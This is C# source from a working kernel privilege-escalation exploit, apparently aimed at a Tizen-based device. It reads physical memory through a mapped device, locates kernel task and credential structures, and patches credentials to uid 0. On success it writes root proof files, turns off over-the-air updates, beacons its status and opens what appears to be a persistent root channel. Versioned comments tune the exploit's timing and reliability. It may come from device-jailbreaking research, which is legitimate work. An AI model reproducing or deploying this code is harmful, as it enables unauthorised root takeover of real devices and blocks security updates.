                        // v38: one read-only high-scan beacon before the exit -
                        // it answers whether the translated parent page is the
                        // parent task or a wrong frame (see HighAllocProbe).
                        HighAllocProbe(child, highParent, logCred);
                        uint logReal = highJunk ? junkReal : highReal;
                        Beacon("high-alloc parent=" + highParent.ToString("x8") +
                               " cred=" + logCred.ToString("x8") +
                               " real=" + logReal.ToString("x8") +
                               " junk=" + (highJunk ? 1 : 0) + " fast-exit");
                        break;
                    }
                    if (getuid() == 0) Beacon("direct-patch uid=0");
                }

                // v28 fallback for the state the v27 cold boot proved: the
                // direct-parent chain dies when OUR OWN task's cred-pointer line
                // reads stale, while cred PAGES read coherently (cuid=5001) and
                // the child's cred is a fork copy of ours from the same cred_jar.
                // Find our cred by CONTENT near the child's cred page.  Skipped
                // when cred pages read stale too (cuid != 5001): the scan would
                // only patch neighbours for nothing.
                // v30: only in a round that follows a wait.  An early scan runs
                // inside the ~15-20 s content window, misses (v28: patched=4,
                // ours still stale), and spends the process-wide 8-cred budget
                // before the post-window round that can actually see ours.
                if (getuid() != 0 && backoffMs[round] > 0)
                {
                    DropPages();
                    uint cc2 = 0;
                    try { cc2 = U32(ReadPhys(V2P(child) + O_CRED, 4), 0); } catch { }
                    if (Kptr(cc2) && CredUid(cc2) == 5001)
                    {
                        if (CredScanNear(cc2, out int scanned))
                            Beacon("cred-scan ROOT patched=" + scanned +
                                   " total=" + _scanPatched);
                        else
                            Beacon("cred-scan miss patched=" + scanned +
                                   " total=" + _scanPatched);
                    }
                    else
                    {
                        Beacon("cred-scan skip anchor=" + cc2.ToString("x8") +
                               " cuid=" + UidWord(Kptr(cc2) ? CredUid(cc2) : 0xFFFFFFFF));
                    }
                }

                // Parent pointer from the landmark -> our task -> our cred.
                // v29: the PHYSRPT scan never fired on a stale attempt 1 (the
                // parent's comm is stale on exactly those attempts, and when
                // comms are coherent the direct-parent path works anyway), so
                // fast mode spends less time here.
                int scanTries = fastMode ? 2 : 20;
                for (int t = 0; t < scanTries && getuid() != 0; t++)
                {
                    uint parent = 0;
                    try
                    {
                        byte[] st = ReadPhys(V2P(child), 0x800);
                        for (int o = 0; o + 4 <= st.Length; o += 4)
                        {
                            uint v = U32(st, o);
                            if (!Kptr(v)) continue;
                            if (CommAt(v, selfTag)) { parent = v; break; }
                        }
                    }
                    catch { }
                    if (parent != 0)
                    {
                        uint cred = 0, real = 0;
                        try { cred = U32(ReadPhys(V2P(parent) + O_CRED, 4), 0); } catch { }
                        try { real = U32(ReadPhys(V2P(parent) + O_REAL, 4), 0); } catch { }
                        Beacon("parent=" + parent.ToString("x8") + " cred=" + cred.ToString("x8"));
                        if (CredUid(cred) == 5001) PatchCred(cred);
                        if (Kptr(real) && real != cred && CredUid(real) == 5001) PatchCred(real);
                        Beacon("parent-patch uid=" + getuid());
                        if (getuid() == 0) break;
                    }
                    Thread.Sleep(700);
                }
                if (getuid() != 0)
                {
                    Beacon("fail round " + round);
                    KillChildren();
                }
            }   // end rounds

            ReapChildren();
            uint uid = getuid();

            if (uid == 0)
            {
                try { File.Delete(TryFile); } catch { }   // reset the counter for the next boot
                string proof = "DSHROOT uid=" + uid + " pid=" + Environment.ProcessId +
                               " self=" + self.ToString("x8") + " kernel=" + baseAddr.ToString("x8") +
                               " init_task=" + initVirt.ToString("x8") + "\n";
                try { Directory.CreateDirectory("/opt/usr/system"); File.WriteAllText(SysProof, proof); } catch { }
                try { File.WriteAllText(Share + "/root_proof.txt", proof); } catch { }
                Beacon("SUCCESS-R00T " + proof.Replace("\n", " "));
                // Pin OTA off in the background: three buxton2ctl spawns used to
                // sit between the root and the listener, delaying the only thing
                // that makes the set usable.  Run() is per-call safe now
                // (unique temp files), so this cannot collide with a command.
                new Thread(() => { try { AutoUpdateOff(); } catch { } }).Start();

                // free the physmap node so the browser path works again
                CloseDevice();

                // Landmark children sleep 120 s; a later kill -9 reparents them
                // to init and the next AUL launch wastes fast attempts on them.
                KillChildren();

                RootChannel();   // never returns
            }
            if (fastMode)
            {
                // Exit so AUL relaunches us (~1 s).  A fresh process re-mmaps the
                // device and reads coherent memory - measurably faster than the
                // in-process retry loop, which kept re-reading the same bad state.
                // Release the device first: AUL's relaunch must not race our own
                // dying process for the same node.
                CloseDevice();
                KillChildren();
                Beacon("fast-exit attempt=" + attempt);
                Thread.Sleep(2000);
                Environment.Exit(0);
            }
            // Long mode exhausted its rounds: release the node and the landmark
            // children before idling, so the browser lane is not blocked for the
            // whole sleep (v39: it used to keep the opener until exit).
            CloseDevice();
            KillChildren();
            Thread.Sleep(120000);
        }
        catch (Exception e)
        {
            // Release the node and the landmark children before idling: this path
            // used to sleep 20 s holding the opener, blocking the browser lane.
            Beacon("exception " + e.GetType().Name + ": " + e.Message);
            CloseDevice();
            KillChildren();
            Thread.Sleep(20000);
        }
    }
}
